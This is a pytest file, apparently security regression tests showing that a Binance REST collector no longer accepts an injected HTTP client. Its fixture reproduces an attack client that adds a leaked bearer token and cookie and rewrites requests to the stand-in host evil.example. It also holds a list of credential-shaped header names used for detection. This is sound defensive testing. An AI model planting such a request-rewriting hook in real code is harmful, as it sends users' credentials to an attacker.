"""D3D-R1: the HTTP client boundary cannot be widened after the endpoint allowlist.

Codex reproduced on ``61dd9bf`` that an injected ``httpx.Client`` could add a ``cookie`` default
header, add ``authorization`` through a request hook and rewrite a validated
``/api/v3/aggTrades`` request to ``https://evil.example/api/v3/account`` — and the transport
received exactly that. These tests fail on ``61dd9bf`` and pass once the collector only ever
sends through a client it builds and owns itself.
"""

from __future__ import annotations

import inspect
import os
from pathlib import Path

import httpx
import pytest

from infrastructure import Settings
from infrastructure.collector.binance_rest import BinanceSpotRestCollector
from infrastructure.revision.rest_identity import RestPageQuery, page_source_uri
from tests.infrastructure.collector.rest_support import (
    ORIGIN,
    SYMBOL,
    T0,
    Answer,
    RestVenue,
    agg_page,
    agg_request,
    make_collector,
    make_storage,
    queue_agg_chain,
)
from tests.infrastructure.parser.rest_support import body

_CREDENTIAL_PARTS = (
    "auth",
    "cookie",
    "credential",
    "key",
    "password",
    "secret",
    "signature",
    "token",
)
_KWARGS: dict[str, object] = {
    "market_data_base_url": ORIGIN,
    "http_connect_timeout_seconds": 1.0,
    "http_read_timeout_seconds": 1.0,
    "http_max_retries": 0,
    "http_user_agent": "hlens-d3d-r1-test/0.0.0",
    "max_pages_per_collect": 5,
    "min_request_interval_ms": 50,
    "max_retry_after_seconds": 1,
    "max_response_bytes": 65_536,
}


@pytest.fixture
def venue() -> RestVenue:
    return RestVenue()


def _hostile_client(seen: list[httpx.Request]) -> httpx.Client:
    """Codex's reproduction: default cookie, an auth hook and an off-origin account rewrite."""

    def hook(request: httpx.Request) -> None:
        request.headers["authorization"] = "Bearer leaked"
        request.url = httpx.URL("https://evil.example/api/v3/account")

    def transport(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, content=b"[]", request=request)

    return httpx.Client(
        transport=httpx.MockTransport(transport),
        headers={"cookie": "session=leaked"},
        event_hooks={"request": [hook]},
    )


def _settings(monkeypatch: pytest.MonkeyPatch) -> Settings:
    for key in [key for key in os.environ if key.startswith("HLENS_")]:
        monkeypatch.delenv(key, raising=False)
    monkeypatch.setenv("HLENS_CATALOG_URI", "postgresql://u:fake@127.0.0.1:5432/db")
    monkeypatch.setenv("HLENS_BINANCE_MARKET_DATA_BASE_URL", ORIGIN)
    return Settings(_env_file=None)  # type: ignore[call-arg]


# ======================================================================================
# the injection entry points are gone
# ======================================================================================


@pytest.mark.parametrize(
    "entry",
    [BinanceSpotRestCollector, BinanceSpotRestCollector.from_settings],
    ids=["__init__", "from_settings"],
)
def test_no_public_entry_point_accepts_a_client(entry: object) -> None:
    parameters = inspect.signature(entry).parameters  # type: ignore[arg-type]
    assert "http_client" not in parameters
    assert not any(
        p.kind in (inspect.Parameter.VAR_KEYWORD, inspect.Parameter.VAR_POSITIONAL)
        for p in parameters.values()
    )
    assert "http_transport" in parameters  # the deterministic test seam is kept


def test_the_reproduced_hostile_client_is_refused_and_never_used(tmp_path: Path) -> None:
    seen: list[httpx.Request] = []
    hostile = _hostile_client(seen)
    with pytest.raises(TypeError):
        BinanceSpotRestCollector(make_storage(tmp_path), http_client=hostile, **_KWARGS)  # type: ignore[call-arg, arg-type]
    assert seen == []
    hostile.close()


def test_from_settings_refuses_a_hostile_client(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[httpx.Request] = []
    hostile = _hostile_client(seen)
    with pytest.raises(TypeError):
        BinanceSpotRestCollector.from_settings(
            _settings(monkeypatch),
            make_storage(tmp_path),
            http_client=hostile,  # type: ignore[call-arg]
        )
    assert seen == []
    hostile.close()


# ======================================================================================
# the owned client has no path to widen a request
# ======================================================================================


def test_the_owned_client_pins_every_post_allowlist_state_off(
    tmp_path: Path, venue: RestVenue
) -> None:
    client = make_collector(make_storage(tmp_path), venue)._client
    assert client.event_hooks == {"request": [], "response": []}
    assert client.auth is None
    assert len(client.cookies) == 0
    assert client.follow_redirects is False
    assert client.trust_env is False
    assert str(client.base_url) == ""
    assert {name.lower() for name in client.headers} <= {
        "accept",
        "accept-encoding",
        "connection",
        "user-agent",
    }


def test_environment_proxies_cannot_reroute_the_production_client(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """With no transport seam (production), ``*_PROXY`` must not mount a rerouting transport."""
    monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")
    monkeypatch.setenv("ALL_PROXY", "http://127.0.0.1:9")
    collector = BinanceSpotRestCollector(make_storage(tmp_path), **_KWARGS)  # type: ignore[arg-type]
    try:
        assert collector._client._mounts == {}
    finally:
        collector.close()


def test_a_set_cookie_answer_is_never_replayed_on_a_later_request(
    tmp_path: Path, venue: RestVenue
) -> None:
    query = RestPageQuery.agg_trades_from_start(SYMBOL, T0)
    venue.serve(
        query,
        Answer(
            payload=body(agg_page(2, first_id=500, first_ms=T0)),
            headers={"set-cookie": "session=from-venue; Path=/"},
        ),
    )
    venue.serve_items(query, agg_page(2, first_id=500, first_ms=T0))
    collector = make_collector(make_storage(tmp_path), venue)

    with pytest.raises(Exception, match="credential-shaped"):
        collector.collect(agg_request(request_id="d3d-r1-cookie-a"))
    collector.collect(agg_request(request_id="d3d-r1-cookie-b"))

    assert len(venue.headers_seen) == 2
    assert "cookie" not in {name.lower() for name in venue.headers_seen[1]}
    assert len(collector._client.cookies) == 0


def test_every_request_reaching_the_transport_is_the_validated_one(
    tmp_path: Path, venue: RestVenue, monkeypatch: pytest.MonkeyPatch
) -> None:
    queries = queue_agg_chain(
        venue,
        SYMBOL,
        T0,
        [
            agg_page(1000, first_id=500, first_ms=T0),
            agg_page(3, first_id=1500, first_ms=T0 + 1000),
        ],
    )
    collector = BinanceSpotRestCollector.from_settings(
        _settings(monkeypatch),
        make_storage(tmp_path),
        http_transport=venue.transport(),
        monotonic=lambda: 0.0,
        sleeper=lambda _seconds: None,
    )
    collector.collect(agg_request(request_id="d3d-r1-exact"))

    assert venue.requests == [page_source_uri(query, ORIGIN) for query in queries]
    for headers in venue.headers_seen:
        names = {name.lower() for name in headers}
        assert not {n for n in names if any(part in n for part in _CREDENTIAL_PARTS)}
        assert names <= {"host", "accept", "accept-encoding", "connection", "user-agent"}
    collector.close()
